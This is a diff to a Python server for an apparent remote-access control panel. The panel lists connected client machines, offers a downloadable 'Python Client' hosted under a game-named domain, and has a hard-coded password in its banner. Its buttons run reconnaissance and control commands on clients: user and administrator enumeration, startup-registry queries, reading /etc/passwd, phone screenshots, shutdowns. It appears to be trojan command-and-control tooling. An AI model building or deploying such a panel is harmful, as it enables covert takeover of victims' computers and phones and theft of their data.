@@ -800,7 +800,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     --success: #28a745;
                     --danger: #dc3545;
                     --warning: #ffc107;
-                    --info: #17a2b8;
                     --dark: #1e1e1e;
                     --darker: #2d2d2d;
                     --light: #f8f9fa;
@@ -947,11 +946,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border: 1px solid rgba(255,193,7,0.3);
                 }
                 
-                button.info { 
-                    background: var(--info); 
-                    border: 1px solid rgba(23,162,184,0.3);
-                }
-                
                 .controls-grid {
                     display: grid;
                     grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
@@ -1002,40 +996,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     border-radius: 8px;
                     margin: 10px 0;
                     border: 1px solid rgba(255,255,255,0.1);
-                }
-                
-                .os-tabs {
-                    display: flex;
-                    background: var(--darker);
-                    border-radius: 8px;
-                    padding: 5px;
-                    margin: 10px 0;
-                }
-                
-                .os-tab {
-                    flex: 1;
-                    padding: 12px;
-                    text-align: center;
-                    cursor: pointer;
-                    border-radius: 6px;
-                    transition: all 0.3s ease;
-                }
-                
-                .os-tab.active {
-                    background: var(--primary);
-                    font-weight: bold;
-                }
-                
-                .os-tab:hover:not(.active) {
-                    background: rgba(255,255,255,0.1);
-                }
-                
-                .os-content {
-                    display: none;
-                }
-                
-                .os-content.active {
-                    display: block;
                 }
                 
                 .security-badge {
@@ -1115,98 +1075,31 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     <div style="background: var(--darker); padding: 20px; border-radius: 10px; border: 1px solid rgba(255,255,255,0.1);">
                         <h3>Selected Client: <span id="currentClient" style="color: var(--success); font-weight: bold;">Not Selected</span></h3>
                         
-                        <!-- نظام التبويب لأنظمة التشغيل -->
-                        <div class="os-tabs">
-                            <div class="os-tab active" onclick="switchOSTab('windows')"> Windows</div>
-                            <div class="os-tab" onclick="switchOSTab('linux')"> Linux</div>
-                            <div class="os-tab" onclick="switchOSTab('phone')"> Phone</div>
-                        </div>
-                        
-                        <!-- قسم Windows -->
-                        <div id="windows-content" class="os-content active">
-                            <div class="multi-control">
-                                <strong>Windows Commands <span class="instant-badge">0ms</span>:</strong>
-                                <div class="controls-grid">
-                                    <button onclick="executeCommand('systeminfo')">System Info</button>
-                                    <button onclick="executeCommand('whoami')">Current User</button>
-                                    <button onclick="executeCommand('ipconfig /all')">Network Info</button>
-                                    <button onclick="executeCommand('dir')">Files List</button>
-                                    <button onclick="executeCommand('tasklist')">Active Processes</button>
-                                    <button onclick="executeCommand('netstat -an')">Network Connections</button>
-                                    <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
-                                    <button onclick="executeCommand('net user')">Users</button>
-                                    <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
-                                    <button onclick="executeCommand('ping google.com')">Connection Test</button>
-                                    <button onclick="executeCommand('calc')">Calculator</button>
-                                    <button onclick="executeCommand('notepad')">Notepad</button>
-                                    <button onclick="executeCommand('cmd /c start')">New CMD</button>
-                                    <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
-                                    <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
-                                    <button onclick="executeCommand('net start')">Active Services</button>
-                                    <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
-                                    <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
-                                    <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
-                                    <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
-                                    <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <!-- قسم Linux -->
-                        <div id="linux-content" class="os-content">
-                            <div class="multi-control">
-                                <strong>Linux Commands <span class="instant-badge">0ms</span>:</strong>
-                                <div class="controls-grid">
-                                    <button onclick="executeCommand('uname -a')">System Info</button>
-                                    <button onclick="executeCommand('whoami')">Current User</button>
-                                    <button onclick="executeCommand('ifconfig')">Network Info</button>
-                                    <button onclick="executeCommand('ls -la')">Files List</button>
-                                    <button onclick="executeCommand('ps aux')">Active Processes</button>
-                                    <button onclick="executeCommand('netstat -tulpn')">Network Connections</button>
-                                    <button onclick="executeCommand('df -h')">Disk Space</button>
-                                    <button onclick="executeCommand('cat /etc/passwd')">Users</button>
-                                    <button onclick="executeCommand('ping -c 4 google.com')">Connection Test</button>
-                                    <button onclick="executeCommand('top -n 1')">System Monitor</button>
-                                    <button onclick="executeCommand('dpkg -l')">Installed Packages</button>
-                                    <button onclick="executeCommand('service --status-all')">Active Services</button>
-                                    <button onclick="executeCommand('crontab -l')">Cron Jobs</button>
-                                    <button onclick="executeCommand('cat /etc/hosts')">Hosts File</button>
-                                    <button onclick="executeCommand('free -h')">Memory Info</button>
-                                    <button onclick="executeCommand('lscpu')">CPU Info</button>
-                                    <button onclick="executeCommand('uptime')">Uptime</button>
-                                    <button onclick="executeCommand('history')">Command History</button>
-                                    <button class="danger" onclick="executeCommand('shutdown -h now')">Shutdown</button>
-                                    <button class="danger" onclick="executeCommand('reboot')">Restart</button>
-                                </div>
-                            </div>
-                        </div>
-                        
-                        <!-- قسم Phone -->
-                        <div id="phone-content" class="os-content">
-                            <div class="multi-control">
-                                <strong>Phone Commands <span class="instant-badge">0ms</span>:</strong>
-                                <div class="controls-grid">
-                                    <button onclick="executeCommand('getprop')">System Properties</button>
-                                    <button onclick="executeCommand('id')">User Info</button>
-                                    <button onclick="executeCommand('netstat')">Network Status</button>
-                                    <button onclick="executeCommand('ls -la')">Files List</button>
-                                    <button onclick="executeCommand('ps')">Running Processes</button>
-                                    <button onclick="executeCommand('df')">Storage Info</button>
-                                    <button onclick="executeCommand('cat /proc/meminfo')">Memory Info</button>
-                                    <button onclick="executeCommand('cat /proc/cpuinfo')">CPU Info</button>
-                                    <button onclick="executeCommand('ping -c 4 google.com')">Connection Test</button>
-                                    <button onclick="executeCommand('dumpsys battery')">Battery Info</button>
-                                    <button onclick="executeCommand('dumpsys wifi')">WiFi Info</button>
-                                    <button onclick="executeCommand('pm list packages')">Installed Apps</button>
-                                    <button onclick="executeCommand('settings list system')">System Settings</button>
-                                    <button onclick="executeCommand('am start -a android.settings.SETTINGS')">Open Settings</button>
-                                    <button onclick="executeCommand('input keyevent 26')">Power Button</button>
-                                    <button onclick="executeCommand('input keyevent 3')">Home Button</button>
-                                    <button onclick="executeCommand('input keyevent 4')">Back Button</button>
-                                    <button onclick="executeCommand('screencap -p /sdcard/screen.png')">Take Screenshot</button>
-                                    <button onclick="executeCommand('dumpsys telephony.registry')">Phone Info</button>
-                                    <button class="warning" onclick="executeCommand('am force-stop com.android.browser')">Stop Browser</button>
-                                </div>
+                        <div class="multi-control">
+                            <strong>Instant Commands <span class="instant-badge">0ms</span>:</strong>
+                            <div class="controls-grid">
+                                <button onclick="executeCommand('sysinfo')">System Info</button>
+                                <button onclick="executeCommand('whoami')">Current User</button>
+                                <button onclick="executeCommand('ipconfig /all')">Network Info</button>
+                                <button onclick="executeCommand('dir')">Files List</button>
+                                <button onclick="executeCommand('tasklist')">Active Processes</button>
+                                <button onclick="executeCommand('netstat -an')">Network Connections</button>
+                                <button onclick="executeCommand('systeminfo')">System Details</button>
+                                <button onclick="executeCommand('wmic logicaldisk get size,freespace,caption')">Disk Space</button>
+                                <button onclick="executeCommand('net user')">Users</button>
+                                <button onclick="executeCommand('net localgroup administrators')">Administrators</button>
+                                <button onclick="executeCommand('ping google.com')">Connection Test</button>
+                                <button onclick="executeCommand('calc')">Calculator</button>
+                                <button onclick="executeCommand('notepad')">Notepad</button>
+                                <button onclick="executeCommand('cmd /c start')">New CMD</button>
+                                <button onclick="executeCommand('shutdown /a')">Cancel Shutdown</button>
+                                <button class="danger" onclick="executeCommand('shutdown /s /t 60')">Shutdown 1m</button>
+                                <button class="danger" onclick="executeCommand('shutdown /r /t 30')">Restart</button>
+                                <button onclick="executeCommand('powershell Get-Process | Sort-Object CPU -Descending | Select-Object -First 10')">Top Processes</button>
+                                <button onclick="executeCommand('wmic product get name,version')">Installed Software</button>
+                                <button onclick="executeCommand('net start')">Active Services</button>
+                                <button onclick="executeCommand('schtasks /query /fo LIST')">Scheduled Tasks</button>
+                                <button onclick="executeCommand('reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"')">Startup Programs</button>
                             </div>
                         </div>
                         
@@ -1222,7 +1115,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
     INSTANT REMOTE CONTROL SYSTEM READY - 0ms DELAY
     
     • Select a client from the left panel
-    • Choose OS type from tabs (Windows/Linux/Phone)
     • Commands execute INSTANTLY with no delay
     • Real-time responses in under 10ms
     • All activities are logged for security
@@ -1236,25 +1128,6 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 let currentClientId = null;
                 let commandCounter = 0;
                 let allClients = [];
-                let currentOSTab = 'windows';
-                
-                function switchOSTab(osType) {
-                    // إخفاء جميع المحتويات
-                    document.querySelectorAll('.os-content').forEach(content => {
-                        content.classList.remove('active');
-                    });
-                    
-                    // إلغاء تفعيل جميع التبويبات
-                    document.querySelectorAll('.os-tab').forEach(tab => {
-                        tab.classList.remove('active');
-                    });
-                    
-                    // تفعيل التبويب والمحتوى المحدد
-                    document.getElementById(osType + '-content').classList.add('active');
-                    document.querySelector(`.os-tab:nth-child(${osType === 'windows' ? 1 : osType === 'linux' ? 2 : 3})`).classList.add('active');
-                    
-                    currentOSTab = osType;
-                }
                 
                 async function loadSessions() {
                     try {
@@ -1347,7 +1220,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                             addToTerminal(`Error: ${data.error}\\n`);
                         }
                     } catch (err) {
-                        addToTerminal(` Network error: ${err}\\n`);
+                        addToTerminal(`❌ Network error: ${err}\\n`);
                     }
                 }
                 
@@ -1505,7 +1378,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                 if incoming_os != 'Unknown':
                     self.sessions[existing_client]['os'] = incoming_os
 
-                print(f" INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f"✅ INSTANT Updated: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': existing_client, 'instant': True})
             else:
                 self.sessions[client_id] = {
@@ -1521,7 +1394,7 @@ class EnhancedRemoteControlHandler(BaseHTTPRequestHandler):
                     'last_response': None,
                     'status': 'online'
                 }
-                print(f" INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
+                print(f"🆕 INSTANT New: {incoming_computer} ({incoming_user}) - {client_ip}")
                 self.send_json({'success': True, 'client_id': client_id, 'instant': True})
                 
     def send_sessions_list(self):
@@ -1689,7 +1562,7 @@ def main():
     threading.Thread(target=instant_cleanup_sessions, daemon=True).start()
     
     print("=" * 80)
-    print(" ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
+    print("🔒 ENHANCED REMOTE CONTROL SERVER - ULTRA INSTANT MODE")
     print("=" * 80)
     print("Control Panel:     https://game-python-1.onrender.com")
     print("Python Client:     https://game-python-1.onrender.com/download-python-client")
@@ -1698,15 +1571,15 @@ def main():
     print("Level 2 Password: sudohacker")
     print("Database:         remote_control.db")
     print("=" * 80)
-    print(" INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
-    print(" All commands execute immediately without delay")
-    print(" Ultra-fast communication and execution")
+    print("⚡ INSTANT MODE ACTIVATED - 0ms RESPONSE TIME")
+    print("🎯 All commands execute immediately without delay")
+    print("🚀 Ultra-fast communication and execution")
     print("=" * 80)
     
     try:
         server = ThreadedHTTPServer(('0.0.0.0', 8080), EnhancedRemoteControlHandler)
-        print(" Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
-        print(" Features: Instant Execution, 0ms Delay, Real-time Responses")
+        print("🚀 Server started INSTANTLY on port 8080! Press Ctrl+C to stop.")
+        print("⚡ Features: Instant Execution, 0ms Delay, Real-time Responses")
         server.serve_forever()
     except KeyboardInterrupt:
         print("Server stopped by user")
